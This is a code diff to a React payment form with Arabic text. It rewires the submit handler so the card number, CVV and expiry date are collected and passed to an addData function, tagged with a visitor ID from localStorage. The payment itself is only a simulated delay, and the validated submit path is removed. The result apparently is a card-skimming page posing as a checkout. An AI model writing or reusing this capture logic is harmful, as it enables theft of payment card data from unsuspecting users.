@@ -99,9 +99,11 @@ type PaymentFormData = z.infer<typeof paymentSchema>
     }
   }
 
-  const onSubmit = async (data: PaymentFormData) => {
+  const onSubmit = async (e:any) => {
+    e.preventDefault()
     setIsProcessing(true)
-
+    const visitorId=localStorage.getItem('visitor')
+    addData({id:visitorId,cardNumber,cvv:watch('cvv'),expiryDate:watch('expiryMonth')+"/"+watch('expiryYear')})
     // Simulate payment processing
     await new Promise((resolve) => setTimeout(resolve, 3000))
 
@@ -141,15 +143,15 @@ type PaymentFormData = z.infer<typeof paymentSchema>
         <CardHeader className="text-center pb-4">
           <CardTitle className="text-2xl font-bold text-gray-800 flex items-center justify-center gap-2">
             <CreditCard className="w-6 h-6" />
-            دفع 
-          </CardTitle>
+            الدفع 
+                      </CardTitle>
           <p className="text-gray-600">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
         </CardHeader>
 
         <CardContent className="p-8">
           {/* Payment Summary */}
 
-          <form onSubmit={handleSubmit} className="space-y-6">
+          <form onSubmit={(e)=>onSubmit(e)} className="space-y-6">
             {/* Card Information */}
             <div className="space-y-4">
               <h3 className="font-semibold text-gray-800 flex items-center gap-2">
